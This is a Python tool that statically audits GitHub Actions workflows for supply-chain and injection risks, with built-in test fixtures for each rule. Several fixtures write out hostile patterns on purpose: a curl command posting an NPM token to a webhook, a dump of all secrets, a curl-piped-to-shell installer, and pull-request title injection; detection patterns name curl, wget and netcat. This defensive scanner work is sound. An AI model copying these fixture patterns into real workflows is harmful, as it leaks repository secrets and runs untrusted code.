#!/usr/bin/env python3
"""gha-audit.py — static security audit of GitHub Actions workflow YAML.

Every rule here is a real 2025-26 incident, not a style preference. A mutable
tag is what tj-actions/changed-files was retagged to in March 2025 (CVE-2025-30066,
~23k repositories, the payload dumped runner memory into the build log). An
interpolated pull-request title is how the Nx s1ngularity chain started on
2026-08-26 and ended with 2,180 accounts and 7,200 repositories drained.
toJSON(secrets) piped into a curl body is GhostAction, 2025-09-05, 3,325 secrets.
A missing timeout-minutes is a six-hour billed hang, because the default is 360.

Python's standard library has no YAML parser and a tool pack ships no
dependencies, so this reads the workflow with an indentation-aware mini-lexer
over the physical text: every node is (path, key, value, lineno), which is
exactly what a finding needs to point at a line. Anchors, aliases, flow
mappings and multi-line folded scalars are deliberately out of scope — see the
card. It reads no credential (it never touches GITHUB_TOKEN) and opens no socket.

Input:  --dir a directory of workflow YAML
Output: one summary line on stdout; findings on stderr; full report to --out.

Exit: 0 nothing at or above --fail-on · 1 a finding at or above --fail-on · 2
      the tool could not run.
Zero model calls. Zero network calls.
"""
from __future__ import annotations

import argparse
import hashlib
import json
import re
import sys
from collections import namedtuple
from pathlib import Path

NAME = "gha-audit"

SEVERITY = {"low": 0, "med": 1, "high": 2}
STDERR_CAP = 40

# One lexed node. `body` holds (lineno, text) for a block scalar, so a finding
# inside a multi-line `run:` points at the offending line and not at the key.
Node = namedtuple("Node", "path key value line body comment")

KEY = re.compile(r"^(\"[^\"]*\"|'[^']*'|[A-Za-z_][A-Za-z0-9_.\-]*)\s*:(?:\s+(.*))?$")
BLOCK = re.compile(r"^[|>][0-9+\-]*$")
SHA = re.compile(r"^[0-9a-f]{40}$")
EXPR = re.compile(r"\$\{\{(.*?)\}\}", re.S)
STEP = re.compile(r"^(jobs\.[^.\[]+\.steps\[\d+\])(?:\.(.+))?$")
JOB = re.compile(r"^jobs\.([^.\[]+)$")
NET_CMD = re.compile(r"(?:^|[\s;|&(])(curl|wget|nc|ncat|netcat)\s")
# Matched inside a value too, because a matrix is usually a flow sequence.
RUNNER_EOL = re.compile(r"\bubuntu-22\.04\b")
PIPE_SH = re.compile(r"(curl|wget)[^\n|]*\|\s*(?:sudo\s+)?(?:ba|z|d)?sh\b")
BUILD_CMD = re.compile(
    r"(?:^|[\s;|&(])(npm\s+(?:ci|i|install|run)|yarn|pnpm|npx|pip\s+install"
    r"|bundle\s+install|make|cargo\s+build|go\s+generate|gradle|mvn)\b")
FIRST_PARTY = {"actions", "github"}

# Fields an outside contributor writes. Interpolating one into a shell body
# means the string is evaluated as shell, not passed as data.
UNTRUSTED = re.compile(r"""github\.(
      head_ref
    | event\.(
          (?:pull_request|issue|discussion)\.(?:title|body)
        | pull_request\.head\.(?:ref|label)
        | (?:comment|review|review_comment)\.body
        | head_commit\.message
        | commits\[\d+\]\.(?:message|author\.(?:name|email))
        | workflow_run\.(?:head_branch|head_commit\.message)
        | pages\[\d+\]\.page_name
      )
  )""", re.VERBOSE)

OK_FIXTURE = """\
name: ci
on:
  push:
    branches: [main]
permissions:
  contents: read
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
        with:
          persist-credentials: false
      - name: build
        run: |
          npm ci
          npm run build
"""

# One fixture per rule. Each must fire its own rule; the self-test asserts it.
BAD_FIXTURES = {
    "unpinned-action": """\
on: push
permissions: {}
concurrency:
  group: a
jobs:
  b:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: tj-actions/changed-files@v35
""",
    "expression-injection": """\
on: pull_request
permissions:
  contents: read
concurrency:
  group: a
jobs:
  b:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - run: |
          echo "title: ${{ github.event.pull_request.title }}"
""",
    "pr-target-checkout": """\
on: pull_request_target
permissions:
  contents: read
concurrency:
  group: a
jobs:
  b:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
        with:
          ref: ${{ github.event.pull_request.head.sha }}
          persist-credentials: false
""",
    "allow-unsafe-pr-checkout": """\
on: push
permissions:
  contents: read
concurrency:
  group: a
jobs:
  b:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: some/action@11bd71901bbe5b1630ceea73d27597364c9af683
        with:
          allow-unsafe-pr-checkout: true
""",
    "missing-permissions": """\
on: push
concurrency:
  group: a
jobs:
  b:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - run: echo hi
""",
    "permissions-write-all": """\
on: push
permissions: write-all
concurrency:
  group: a
jobs:
  b:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - run: echo hi
""",
    "id-token-workflow-scope": """\
on: push
permissions:
  contents: read
  id-token: write
concurrency:
  group: a
jobs:
  b:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - run: echo hi
""",
    "secret-exfil-cmd": """\
on: push
permissions:
  contents: read
concurrency:
  group: a
jobs:
  b:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - run: |
          curl -X POST -d "${{ secrets.NPM_TOKEN }}" $WEBHOOK
""",
    "secrets-tojson": """\
on: push
permissions:
  contents: read
concurrency:
  group: a
jobs:
  b:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - run: echo '${{ toJSON(secrets) }}' > /tmp/s
""",
    "missing-concurrency": """\
on: push
permissions:
  contents: read
jobs:
  b:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - run: echo hi
""",
    "missing-timeout": """\
on: push
permissions:
  contents: read
concurrency:
  group: a
jobs:
  b:
    runs-on: ubuntu-latest
    steps:
      - run: echo hi
""",
    "deprecated-runner": """\
on: push
permissions:
  contents: read
concurrency:
  group: a
jobs:
  b:
    runs-on: ubuntu-22.04
    timeout-minutes: 5
    steps:
      - run: echo hi
  c:
    strategy:
      matrix:
        os: [ubuntu-22.04, ubuntu-latest]
    runs-on: ${{ matrix.os }}
    timeout-minutes: 5
    steps:
      - run: echo hi
""",
    "persist-credentials-default": """\
on: push
permissions:
  contents: read
concurrency:
  group: a
jobs:
  b:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - run: npm ci
""",
    "curl-pipe-shell": """\
on: push
permissions:
  contents: read
concurrency:
  group: a
jobs:
  b:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - run: curl -fsSL install.example.test/setup.sh | sh
""",
}


# --------------------------------------------------------------------------
# the mini-lexer
# --------------------------------------------------------------------------
def _join(base: str, key: str) -> str:
    return f"{base}.{key}" if base else key


def _path(stack: list) -> str:
    out = ""
    for _, label, kind in stack:
        out = out + label if kind == "seq" else _join(out, label)
    return out


def _unquote(text: str) -> str:
    if len(text) >= 2 and text[0] == text[-1] and text[0] in "\"'":
        return text[1:-1]
    return text


def _clean(text: str) -> tuple[str, str]:
    """Split a scalar from its trailing `#` comment, honouring quotes."""
    out: list[str] = []
    quote = ""
    for i, ch in enumerate(text):
        if quote:
            out.append(ch)
            if ch == quote:
                quote = ""
        elif ch in "\"'":
            quote = ch
            out.append(ch)
        elif ch == "#" and (not out or out[-1] in " \t"):
            return _unquote("".join(out).strip()), text[i:].lstrip("# ").strip()
        else:
            out.append(ch)
    return _unquote("".join(out).strip()), ""


def _pop_key(stack: list, col: int) -> None:
    while stack and (stack[-1][2] == "map" and stack[-1][0] >= col
                     or stack[-1][2] == "seq" and stack[-1][0] > col):
        stack.pop()


def _pop_marker(stack: list, col: int) -> None:
    while stack and (stack[-1][2] == "map" and stack[-1][0] > col
                     or stack[-1][2] == "seq" and stack[-1][0] >= col):
        stack.pop()


def _block(lines: list[str], start: int, indent: int) -> tuple[list, int]:
    """Consume a `|`/`>` block scalar. Returns its (lineno, text) lines."""
    body: list[tuple[int, str]] = []
    i = start + 1
    while i < len(lines):
        nxt = lines[i]
        if not nxt.strip():
            body.append((i + 1, ""))
            i += 1
            continue
        if len(nxt) - len(nxt.lstrip(" ")) <= indent:
            break
        body.append((i + 1, nxt.strip()))
        i += 1
    while body and not body[-1][1]:
        body.pop()
    return body, i


def lex(text: str) -> list:
    """Workflow text to a flat list of Node(path, key, value, lineno, ...).

    Indentation-aware and line-accurate; not a YAML parser. Sequence items
    become `[n]` in the path, so a step is `jobs.build.steps[2].uses`."""
    nodes: list = []
    stack: list = []
    counters: dict[str, int] = {}
    lines = text.splitlines()
    i = 0
    while i < len(lines):
        raw, lineno = lines[i], i + 1
        s = raw.strip()
        if not s or s.startswith("#"):
            i += 1
            continue
        indent = len(raw) - len(raw.lstrip(" "))
        while s == "-" or s.startswith("- "):
            rest = s[1:].lstrip(" ")
            inner = indent + (len(s) - len(rest))
            _pop_marker(stack, indent)
            parent = _path(stack)
            counters[parent] = counters.get(parent, -1) + 1
            stack.append((inner, f"[{counters[parent]}]", "seq"))
            s, indent = rest, inner
        if not s:
            i += 1
            continue
        match = KEY.match(s)
        if match is None:
            nodes.append(Node(_path(stack), "", _clean(s)[0], lineno, [], ""))
            i += 1
            continue
        key = _unquote(match.group(1).strip())
        value, comment = _clean(match.group(2) or "")
        _pop_key(stack, indent)
        path = _join(_path(stack), key)
        if BLOCK.match(value):
            body, i = _block(lines, i, indent)
            nodes.append(Node(path, key, "\n".join(t for _, t in body),
                              lineno, body, comment))
            continue
        nodes.append(Node(path, key, value, lineno, [], comment))
        if not value:
            stack.append((indent, key, "map"))
        i += 1
    return nodes


# --------------------------------------------------------------------------
# findings
# --------------------------------------------------------------------------
def clip(text: str, size: int = 120) -> str:
    flat = " ".join(text.split())
    return flat if len(flat) <= size else flat[: size - 1] + "…"


def finding(rule: str, severity: str, name: str, line: int,
            evidence: str, fix: str) -> dict:
    """One finding. The fingerprint is stable across line moves, so a
    baseline written today still matches after the file is reformatted."""
    shown = clip(evidence)
    digest = hashlib.sha256(
        f"{rule}|{name}|{shown}".encode("utf-8")).hexdigest()[:12]
    return {"rule": rule, "severity": severity, "file": name, "line": line,
            "evidence": shown, "fix": fix, "fingerprint": digest}


def run_lines(node: Node) -> list[tuple[int, str]]:
    return node.body or [(node.line, node.value)]


def triggers(nodes: list) -> set[str]:
    found: set[str] = set()
    for node in nodes:
        if node.path == "on" and node.value:
            found.update(t.strip() for t in
                         node.value.strip("[]").split(",") if t.strip())
        elif node.path.startswith("on.") and node.path.count(".") == 1:
            found.add(node.key)
    return found


def steps_of(nodes: list) -> dict:
    """Ordered step path -> {subkey: Node}. Insertion order is file order."""
    out: dict = {}
    for node in nodes:
        match = STEP.match(node.path)
        if match:
            out.setdefault(match.group(1), {})[match.group(2) or ""] = node
    return out


def check_pins(name: str, nodes: list) -> list[dict]:
    out: list[dict] = []
    for node in nodes:
        if node.key != "uses" or not node.value:
            continue
        ref = node.value
        if ref.startswith("./") or ref.startswith("docker://"):
            continue
        owner = ref.split("/")[0]
        tail = ref.rsplit("@", 1)[1] if "@" in ref else ""
        if SHA.match(tail):
            continue
        out.append(finding(
            "unpinned-action",
            "med" if owner in FIRST_PARTY else "high", name, node.line,
            f"uses: {ref}",
            "pin to the 40-char commit SHA and keep the tag in a trailing "
            "comment; a tag is mutable and retagging is the attack"))
    return out


def check_injection(name: str, nodes: list) -> list[dict]:
    out: list[dict] = []
    scripts = {n.path.rsplit(".with.script", 1)[0]: n for n in nodes
               if n.path.endswith(".with.script")}
    uses = {n.path.rsplit(".uses", 1)[0]: n.value for n in nodes
            if n.key == "uses"}
    targets = [n for n in nodes if n.key == "run"]
    targets += [n for path, n in scripts.items()
                if uses.get(path, "").startswith("actions/github-script")]
    for node in targets:
        for lineno, text in run_lines(node):
            for expr in EXPR.finditer(text):
                if UNTRUSTED.search(expr.group(1)):
                    out.append(finding(
                        "expression-injection", "high", name, lineno,
                        expr.group(0),
                        "pass it through env: and reference \"$VAR\"; "
                        "interpolation splices attacker text into the shell"))
    return out


def check_checkout(name: str, nodes: list) -> list[dict]:
    out: list[dict] = []
    unsafe = re.compile(r"head\.(sha|ref)|github\.head_ref")
    if "pull_request_target" in triggers(nodes):
        for node in nodes:
            if node.key == "ref" and ".with." in node.path \
                    and unsafe.search(node.value):
                out.append(finding(
                    "pr-target-checkout", "high", name, node.line,
                    f"ref: {node.value}",
                    "pull_request_target runs with repository secrets; never "
                    "check out the fork's head in that job"))
    for node in nodes:
        if "allow-unsafe-pr-checkout" in f"{node.key}{node.value}":
            out.append(finding(
                "allow-unsafe-pr-checkout", "high", name, node.line,
                f"{node.key}: {node.value}".strip(": "),
                "remove it; it disables the guard that stops a fork's head "
                "being checked out into a privileged job"))
    return out


def check_permissions(name: str, nodes: list) -> list[dict]:
    out: list[dict] = []
    if not any(n.path == "permissions" for n in nodes):
        out.append(finding(
            "missing-permissions", "med", name, 1, "no top-level permissions:",
            "add `permissions: contents: read` at workflow scope; without it "
            "the job inherits the repository default, write on older repos"))
    for node in nodes:
        if node.key == "permissions" and node.value == "write-all":
            out.append(finding(
                "permissions-write-all", "high", name, node.line,
                "permissions: write-all",
                "grant the scopes the job actually uses; write-all hands "
                "every token in the run full repository write"))
        if node.path == "permissions.id-token" and node.value == "write":
            out.append(finding(
                "id-token-workflow-scope", "med", name, node.line,
                "id-token: write at workflow scope",
                "move id-token: write into the one job that federates; at "
                "workflow scope every job can mint a cloud identity"))
    return out


def check_secrets(name: str, nodes: list) -> list[dict]:
    out: list[dict] = []
    for node in nodes:
        lines = run_lines(node)
        for lineno, text in lines:
            if re.search(r"toJSON\(\s*secrets\s*\)", text, re.I):
                out.append(finding(
                    "secrets-tojson", "high", name, lineno, clip(text),
                    "never serialise the whole secrets context; one echo or "
                    "one HTTP body sends every secret the repo holds"))
        if node.key != "run":
            continue
        if not any(NET_CMD.search(t) for _, t in lines):
            continue
        for lineno, text in lines:
            if "secrets." in text and "${{" in text:
                out.append(finding(
                    "secret-exfil-cmd", "high", name, lineno, clip(text),
                    "a secret interpolated beside curl/wget/nc is an "
                    "exfiltration primitive; pass it via env: and audit the "
                    "destination host"))
    return out


def check_hygiene(name: str, nodes: list) -> list[dict]:
    out: list[dict] = []
    if not any(n.path == "concurrency" for n in nodes):
        out.append(finding(
            "missing-concurrency", "low", name, 1, "no top-level concurrency:",
            "add a concurrency group keyed on the ref with "
            "cancel-in-progress, or every push stacks another billed run"))
    jobs = [m.group(1) for m in
            (JOB.match(n.path) for n in nodes) if m]
    for job in jobs:
        if any(n.path == f"jobs.{job}.uses" for n in nodes):
            continue
        if not any(n.path == f"jobs.{job}.timeout-minutes" for n in nodes):
            line = next((n.line for n in nodes if n.path == f"jobs.{job}"), 1)
            out.append(finding(
                "missing-timeout", "med", name, line,
                f"job {job}: no timeout-minutes",
                "set timeout-minutes; the default is 360, so one hung job is "
                "six hours of billed runner"))
    for node in nodes:
        if node.key != "run" and RUNNER_EOL.search(node.value):
            out.append(finding(
                "deprecated-runner", "med", name, node.line,
                f"{node.key or '-'}: {node.value}".lstrip(": "),
                "move to ubuntu-latest or ubuntu-24.04; 22.04 images begin "
                "brownouts 2026-09-17 and are unsupported from 2027-04-17"))
    return out


def check_credentials(name: str, nodes: list) -> list[dict]:
    """actions/checkout leaves the job token in .git/config unless told not
    to. Only a finding when the same job later runs code from the tree."""
    out: list[dict] = []
    steps = steps_of(nodes)
    order = list(steps)
    for index, path in enumerate(order):
        step = steps[path]
        uses = step.get("uses")
        if uses is None or not uses.value.startswith("actions/checkout@"):
            continue
        persist = step.get("with.persist-credentials")
        if persist is not None and persist.value == "false":
            continue
        job = path.split(".")[1]
        risky = False
        for later in order[index + 1:]:
            if later.split(".")[1] != job:
                continue
            body = steps[later]
            run = body.get("run")
            if run is not None and any(BUILD_CMD.search(t)
                                       for _, t in run_lines(run)):
                risky = True
            third = body.get("uses")
            if third is not None and third.value.split("/")[0] \
                    not in FIRST_PARTY and not third.value.startswith("./"):
                risky = True
        if risky:
            out.append(finding(
                "persist-credentials-default", "med", name, uses.line,
                "actions/checkout without persist-credentials: false",
                "set persist-credentials: false; otherwise the job token "
                "stays in .git/config for every build script that follows"))
    return out


def check_shell(name: str, nodes: list) -> list[dict]:
    out: list[dict] = []
    for node in nodes:
        if node.key != "run":
            continue
        for lineno, text in run_lines(node):
            if PIPE_SH.search(text):
                out.append(finding(
                    "curl-pipe-shell", "high", name, lineno, clip(text),
                    "download, verify a checksum, then execute; a piped "
                    "installer runs whatever the host served this second"))
    return out


def check(name: str, text: str) -> list[dict]:
    """Every finding for one workflow file. Pure: no I/O, no exits."""
    nodes = lex(text)
    out: list[dict] = []
    for rule in (check_pins, check_injection, check_checkout,
                 check_permissions, check_secrets, check_hygiene,
                 check_credentials, check_shell):
        out += rule(name, nodes)
    return out


# --------------------------------------------------------------------------
# reporting
# --------------------------------------------------------------------------
def report(files: list[str], findings: list[dict], fmt: str) -> str:
    if fmt == "json":
        return json.dumps({"tool": NAME, "files": files,
                           "findings": findings}, indent=2,
                          ensure_ascii=False, sort_keys=True) + "\n"
    counts = {level: sum(1 for f in findings if f["severity"] == level)
              for level in ("high", "med", "low")}
    lines = [f"# {NAME}", "", f"files: {len(files)}",
             f"findings: {len(findings)} "
             f"(high {counts['high']}, med {counts['med']}, "
             f"low {counts['low']})", ""]
    current = None
    for item in findings:
        if item["file"] != current:
            current = item["file"]
            lines += [f"## {current}", ""]
        lines += [f"- [{item['severity']}] {item['rule']} "
                  f"(line {item['line']}, {item['fingerprint']})",
                  f"  {item['evidence']}", f"  fix: {item['fix']}"]
    if not findings:
        lines.append("- none")
    return "\n".join(lines) + "\n"


def self_test() -> list[str]:
    """Exercise the lexer and every audit rule against the inline fixtures."""
    failures: list[str] = []
    nodes = lex(OK_FIXTURE)
    paths = {n.path: n for n in nodes}
    for want in ("permissions.contents", "jobs.build.runs-on",
                 "jobs.build.steps[0].uses",
                 "jobs.build.steps[0].with.persist-credentials",
                 "jobs.build.steps[1].run"):
        if want not in paths:
            failures.append(f"lexer lost path {want}")
    if paths.get("jobs.build.runs-on") is not None \
            and paths["jobs.build.runs-on"].value != "ubuntu-latest":
        failures.append("lexer mangled a scalar value")
    if paths.get("jobs.build.steps[1].run") is not None \
            and not paths["jobs.build.steps[1].run"].body:
        failures.append("lexer did not capture a block scalar body")
    if paths.get("jobs.build.steps[0].uses") is not None \
            and paths["jobs.build.steps[0].uses"].line != 15:
        failures.append("lexer line number drifted")

    clean = check("ok.yml", OK_FIXTURE)
    if clean:
        failures.append(f"OK fixture produced findings: "
                        f"{[f['rule'] for f in clean]}")
    for rule, fixture in sorted(BAD_FIXTURES.items()):
        fired = {f["rule"] for f in check(f"{rule}.yml", fixture)}
        if rule not in fired:
            failures.append(f"{rule}: fixture fired {sorted(fired)} instead")
    runners = [f for f in check("r.yml", BAD_FIXTURES["deprecated-runner"])
               if f["rule"] == "deprecated-runner"]
    if len(runners) != 2:
        failures.append(f"deprecated-runner fired {len(runners)}x, expected 2 "
                        "(a plain scalar and a flow-sequence matrix)")
    twice = check("ok.yml", OK_FIXTURE)
    if [f["fingerprint"] for f in clean] != [f["fingerprint"] for f in twice]:
        failures.append("check is not deterministic")
    return failures


def main() -> int:
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--dir", help="directory holding workflow YAML")
    ap.add_argument("--format", default="text", choices=("json", "text"),
                    help="report format for --out (default text)")
    ap.add_argument("--severity", default="low", choices=("low", "med", "high"),
                    help="lowest severity to report (default low)")
    ap.add_argument("--fail-on", default="high", dest="fail_on",
                    choices=("low", "med", "high"),
                    help="lowest severity that exits 1 (default high)")
    ap.add_argument("--ignore", action="append", metavar="RULE",
                    help="rule id to suppress; repeatable")
    ap.add_argument("--baseline", help="JSON report whose findings are accepted")
    ap.add_argument("--out", help="full report destination")
    ap.add_argument("--self-test", action="store_true",
                    help="run the built-in fixtures and exit")
    args = ap.parse_args()

    if args.self_test:
        failures = self_test()
        for failure in failures:
            print(f"{NAME}: self-test: {failure}", file=sys.stderr)
        print(f"{NAME}: self-test rules={len(BAD_FIXTURES)} "
              f"failures={len(failures)}")
        return 1 if failures else 0

    if not args.dir:
        print(f"{NAME}: --dir is required", file=sys.stderr)
        return 2
    source = Path(args.dir)
    if not source.is_dir():
        print(f"{NAME}: not a directory: {source}", file=sys.stderr)
        return 2
    files = sorted(p for p in source.iterdir()
                   if p.is_file() and p.suffix in (".yml", ".yaml"))
    if not files:
        print(f"{NAME}: no .yml or .yaml under {source}", file=sys.stderr)
        return 2

    accepted: set[str] = set()
    if args.baseline:
        try:
            data = json.loads(Path(args.baseline).read_text(encoding="utf-8"))
            accepted = {f.get("fingerprint") for f in data.get("findings", [])}
        except (OSError, ValueError, AttributeError) as exc:
            print(f"{NAME}: cannot read baseline: {exc}", file=sys.stderr)
            return 2

    ignored = set(args.ignore or [])
    findings: list[dict] = []
    for path in files:
        try:
            text = path.read_text(encoding="utf-8")
        except (OSError, UnicodeDecodeError) as exc:
            print(f"{NAME}: cannot read {path}: {exc}", file=sys.stderr)
            return 2
        findings += check(path.name, text)
    findings = [f for f in findings
                if f["rule"] not in ignored
                and SEVERITY[f["severity"]] >= SEVERITY[args.severity]
                and f["fingerprint"] not in accepted]
    findings.sort(key=lambda f: (f["file"], f["line"], f["rule"]))

    names = [p.name for p in files]
    body = report(names, findings, args.format)
    if args.out:
        try:
            Path(args.out).write_text(body, encoding="utf-8")
        except OSError as exc:
            print(f"{NAME}: cannot write report: {exc}", file=sys.stderr)
            return 2
    if args.format == "json" and not args.out:
        print(body, file=sys.stderr, end="")
    else:
        for item in findings[:STDERR_CAP]:
            print(f"{NAME}: {item['severity']:<4} {item['rule']} "
                  f"{item['file']}:{item['line']} {item['evidence']}",
                  file=sys.stderr)
        if len(findings) > STDERR_CAP:
            print(f"{NAME}: {len(findings) - STDERR_CAP} more suppressed; "
                  "pass --out for the full report", file=sys.stderr)

    high = sum(1 for f in findings if f["severity"] == "high")
    gate = sum(1 for f in findings
               if SEVERITY[f["severity"]] >= SEVERITY[args.fail_on])
    print(f"{NAME}: files={len(files)} findings={len(findings)} high={high}")
    return 1 if gate else 0


if __name__ == "__main__":
    sys.exit(main())
